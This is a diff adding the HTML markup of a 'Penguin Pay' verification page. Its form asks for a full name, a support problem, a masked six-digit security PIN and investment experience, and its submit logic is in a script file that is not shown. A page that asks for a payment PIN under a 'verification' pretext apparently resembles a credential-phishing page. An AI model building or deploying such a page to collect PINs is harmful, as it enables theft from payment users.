@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Penguin Pay — Verification</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="verification.css" />
+</head>
+<body>
+  <div class="background">
+    <div class="orb orb-1"></div>
+    <div class="orb orb-2"></div>
+    <div class="orb orb-3"></div>
+  </div>
+
+  <header class="top-bar">
+    <div class="top-bar-inner">
+      <div class="brand-block">
+        <img src="assets/logo.png" alt="Penguin Pay logo" class="header-logo" />
+        <div>
+          <h1>Welcome to Penguin Pay</h1>
+          <p>Please complete your verification</p>
+        </div>
+      </div>
+      <a href="index.html" class="btn-logout">Logout</a>
+    </div>
+  </header>
+
+  <main class="verification-page">
+    <section class="verification-card">
+      <h2>Verification Details</h2>
+
+      <form class="verification-form" id="verificationForm" novalidate>
+        <div class="field">
+          <label for="fullName">Full Name</label>
+          <input
+            type="text"
+            id="fullName"
+            name="fullName"
+            placeholder="Enter your name"
+            autocomplete="name"
+            required
+          />
+          <p class="field-error hidden" id="fullNameError">Please enter your full name</p>
+        </div>
+
+        <div class="field">
+          <label for="problem">Problem</label>
+          <div class="select-wrapper">
+            <select id="problem" name="problem" required>
+              <option value="" disabled selected>Select your problem</option>
+              <option value="id-auto-logout">Id auto Logout</option>
+              <option value="slow-sell">Slow sell</option>
+              <option value="quote-not-added">Quote not added</option>
+              <option value="verify-account">Verify Account</option>
+            </select>
+            <span class="select-arrow" aria-hidden="true">
+              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+                <polyline points="6 9 12 15 18 9"/>
+              </svg>
+            </span>
+          </div>
+          <p class="field-error hidden" id="problemError">Please select a problem</p>
+        </div>
+
+        <div class="field">
+          <label for="securityPin">Security PIN (6 Digits)</label>
+          <div class="pin-wrapper">
+            <input
+              type="password"
+              id="securityPin"
+              name="securityPin"
+              placeholder="••••••"
+              inputmode="numeric"
+              maxlength="6"
+              autocomplete="off"
+              required
+            />
+            <button type="button" class="toggle-pin" aria-label="Show PIN">
+              <svg class="icon-eye" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
+                <circle cx="12" cy="12" r="3"/>
+              </svg>
+              <svg class="icon-eye-off hidden" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/>
+                <path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/>
+                <line x1="1" y1="1" x2="23" y2="23"/>
+              </svg>
+            </button>
+          </div>
+          <p class="field-error hidden" id="pinError">Security PIN must be exactly 6 digits</p>
+        </div>
+
+        <div class="field">
+          <label for="experience">Investment Experience</label>
+          <div class="select-wrapper">
+            <select id="experience" name="experience" required>
+              <option value="" disabled selected>Select experience Level</option>
+              <option value="beginner">Beginner (0–1 years)</option>
+              <option value="intermediate">Intermediate (1–3 years)</option>
+              <option value="experienced">Experienced (3–5 years)</option>
+              <option value="expert">Expert (5+ years)</option>
+            </select>
+            <span class="select-arrow" aria-hidden="true">
+              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+                <polyline points="6 9 12 15 18 9"/>
+              </svg>
+            </span>
+          </div>
+          <p class="field-error hidden" id="experienceError">Please select your experience level</p>
+        </div>
+
+        <p class="form-status hidden" id="formStatus"></p>
+        <button type="submit" class="btn-submit" id="submitBtn">Submit Verification</button>
+      </form>
+    </section>
+
+    <footer class="verification-footer">
+      <p>TRUSTED PAYMENT PLATFORM IN INDIA</p>
+    </footer>
+  </main>
+
+  <script src="verification.js"></script>
+</body>
+</html>
